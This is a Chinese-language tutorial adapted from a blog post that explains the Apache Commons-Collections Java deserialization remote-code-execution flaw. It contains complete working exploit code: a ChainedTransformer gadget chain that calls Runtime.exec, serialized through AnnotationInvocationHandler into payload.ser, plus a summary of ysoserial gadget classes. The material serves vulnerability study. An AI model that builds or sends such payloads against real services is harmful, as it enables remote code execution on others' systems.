# Java反序列化之Commons-Collections

以下内容引自CSDN「Badcode」在其「[Java反序列化之Commons-Collections](https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/)」的博文，具体内容已经是精简后的版本：

## Apache Commons-Collections 简介

Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。

一些Java应用程序\(Weblogic，Websphere，Jboss，Jenkins，Coldfusion等\)的RCE漏洞都是因为Commons-Collections的反序列化造成的。

## 漏洞原理

Apache Commons Collections 中提供 了一个Transformer的类，这个接口的功能就是将一个对象转换为另外一个对象。

首先关注一下几个重要的类：

* `invokeTransformer`
  * Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）
* `ChainedTransformer`
  * Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）
* `ConstantTransformer`
  * Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）

首先来看看`invokeTransformer`类和`transform`方法

```java
public class InvokerTransformer implements Transformer, Serializable {

......

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if(input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
}
```

可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象\(反射机制就是可以把一个类,类的成员\(函数,属性\),当成一个对象来操作,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们\)，`iMethodName`，`iParamTypes`为调用的方法名称以及该方法的参数类型，`iArgs`为对应方法的参数，在`invokeTransformer`这个类的构造函数中我们可以发现，这三个参数均为可控参数。这里我们需要传入三个参数：方法名，参数类型，参数值。这样就可以调用对象中的任意函数了

尝试使用`invokeTransformer`来执行命令。

```java
import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerTest
{
    public static void main(String[] args){
       InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{new String("calc")});
        invokerTransformer.transform(Runtime.getRuntime());

    }
}
```

接下来得寻找会自动调用`InvokerTransformer`类中的`transform()`方法，构造代码执行。明显调用`transform()`方法有以下两个类：

* TransformedMap
* LazyMap

### **TransformedMap**

Apache Commons Collections 中实现了类`TransformedMap`，用来对`Map`进行某种变换。只要调用decorate\(\)函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate\(\)函数如下

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

* 其中，**Transformer参数是定义如何变换的函数**。
* Map中的任意项的Key或者Value被修改，相应的Transformer\(keyTransformer或者valueTransformer\)的`transform`方法就会被调用。

`TransformedMap`实现了Map接口，并且其中有个`setValue`方法，每当调用map的`setValue`方法时，该方法将会被调用。

`TransformedMap`父类`AbstractInputCheckedMapDecorator`类中有对setValue的重写:

```java
public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
}
```

跟进`checkSetValue`，此处会调用`transform`方法。

```java
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

流程即为：`setValue ==> checkSetValue ==> valueTransformer.transform(value)`。

好的，现在已经找到了反射调用的上一步调用，这里为了多次进行多次反射调用，我们可以将多个 `InvokerTransformer`实例级联在一起组成一个 `ChainedTransformer` 对象，在其调用的时候会进行一个级联 `transform()` 调用：

```java
public class ChainedTransformer implements Transformer, Serializable {
...省略...
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

这个函数迭代了所有`Transformer`类中`transform`方法，并将传回来的object对象放到下一个`Transformer`中进行使用。

这里还有一个`ConstantTransformer`类，它只是返回我们传进去的对象。于是我们可以传入`Runtime.class`对象,就能进行命令执行操作了。

```java
**
 * Constructor that performs no validation.
 * Use <code>getInstance</code> if you want that.
 * 
 * @param constantToReturn  the constant to return each time
 */
public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}
 
 /**
 * Transforms the input by ignoring it and returning the stored constant instead.
 * 
 * @param input  the input object which is ignored
 * @return the stored constant
 */
public Object transform(Object input) {
    return iConstant;
}
```

这样就可以形成我们一个执行任意代码的执行链了：

```java
Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",                  //方法名
                    new Class[] {String.class, Class[].class },  //参数类型
                    new Object[] {"getRuntime", new Class[0] }), //参数值
            new InvokerTransformer("invoke", 
                    new Class[] {Object.class, Object[].class }, 
                    new Object[] {null, new Object[0] }),
            new InvokerTransformer("exec",
                    new Class[] {String.class },
                    new Object[] {"calc"})
        };
```

通过上述分析的触发条件，生成一个`TransformedMap`，并且修改这个Map的value值，即可触发。

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class payloadTest {
    public static void main(String[] args) throws IOException {
        Transformer[] transformers = new Transformer[]{
             new ConstantTransformer(Runtime.class),
             new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
             new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
             new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //Runtime.getRuntime().exec("calc");
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map inMap = new HashMap();
        inMap.put("key", "value");
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);//生成

        //outMap.put("v1","v2");//同样会触发transform方法
        for (Iterator iterator = outMap.entrySet().iterator(); iterator.hasNext();){
            Map.Entry entry = (Map.Entry) iterator.next();
            entry.setValue("123");
        }
    }
}
```

运行并弹出计算器。

{% hint style="info" %}
其实，只要调用`TransformedMap`的`setValue/put/putAll`中的任意方法都会调用`InvokerTransformer`类的`transform`方法，从而也就会触发命令执行。
{% endhint %}

### **LazyMap**

`LazyMap`实现了`Map`接口，其中的`get(Object)`方法调用了`transform()`方法，跟进函数进去

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

这里可以看到，在调用`transform()`方法之前会先判断当前Map中是否已经有该key，如果没有最终会由这里的`factory.transform()`进行处理，跟踪`facory`变量找到`decorate()`方法。

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

这里的`decorate()`方法会对`factory`进行初始化，同时实例化一个`LazyMap`，为了能成功调用`transform()`方法，找到了`LazyMap`，发现在`get()`方法中调用了`transform()`方法，那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的`get(Object)`方法。

## 漏洞利用

上面的`TransformedMap`的`setValue()`还是`LazyMap`的`get()`方法都是需要手动调用。现在希望的是在序列化数据反序列化时，执行`readObject()`方法，并自动触发。

这里配合我们执行代码的类就是`AnnotationInvocationHandler`，该类是java运行库中的一个类，并且包含一个`Map`对象属性，其`readObject`方法有自动修改自身Map属性的操作。

```java
private final Class<? extends Annotation> type;
private final Map<String, Object> memberValues;
 
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
    this.type = type;
    this.memberValues = memberValues;
}
 
 
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();
 
 
    // Check to make sure that types have not evolved incompatibly
    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);//判断第一个参数是否为AnnotationType，因此使用Retention.class传入较好。  
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; all bets are off
        return;
    }
 
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
 
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||    // 获取的值不是annotationType类型，便会触发setValue。这里只需用简单的String即可触发。
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(               // 此处触发一些列的Transformer
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
}
```

可以注意到 `memberValue` 是 `AnnotationInvocationHandler` 类中类型声明为 `Map<String, Object>` 的成员变量，刚好和之前构造的 `TransformedMap` 类型相符，因此我们可以通过 Java 的反射机制动态的获取 `AnnotationInvocationHandler` 类，使用精心构造好的 `TransformedMap` 作为它的实例化参数，然后将实例化的 `AnnotationInvocationHandler` 进行序列化得到二进制数据，最后传递给具有相应环境的序列化数据交互接口使之触发命令执行的 Gadget。利用测试代码如下：

```java
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class CommonsCollectionPayload {
    public static void main(String[] args) throws Exception {
        /*
         * Runtime.getRuntime().exec("calc");
         */
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map inMap = new HashMap();
        inMap.put("key", "value");
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(new Object[] { Retention.class, outMap });
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(instance);
        oos.flush();
        oos.close();

        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        // 触发代码执行
        Object newObj = ois.readObject();
        ois.close();
    }
}
```

## 总结

通过对ysoserial中关于CommonsCollection的七个利用方式的分析我们可以对可以利用的恶意类做一个总结：

### 四大Tranformer的tranform方法的作用

> 1.ChainedTransformer：循环调用成员变量iTransformers数组的中ransformer中的tranform方法。
>
> 2.InvokerTransformer： 通过反射的方法调用传入tranform方法中的inuput对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）
>
> 3.ConstantTransformer：返回成员变量iConstant的值。
>
> 4.InstantiateTransformer：通过反射的方法返回传入参数input的实力。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）

### 三大Map的作用

> 1.lazyMap：通过调用lazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。
>
> 2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和lazyMap配合使用。
>
> 3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。

### 五大反序列化利用基类

> 1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。
>
> 2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的tranform方法，用来直接和Tranformer配合使用。
>
> 3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。
>
> 4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。
>
> 5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和lazyMap配合使用。

## 参考文献

* [java反序列化漏洞原理分析](http://www.angelwhu.com/blog/?p=394)
* [JAVA反序列化漏洞知识点整理](http://www.beesfun.com/2017/05/07/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/)
* [Lib之过？Java反序列化漏洞通用利用分析](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/)

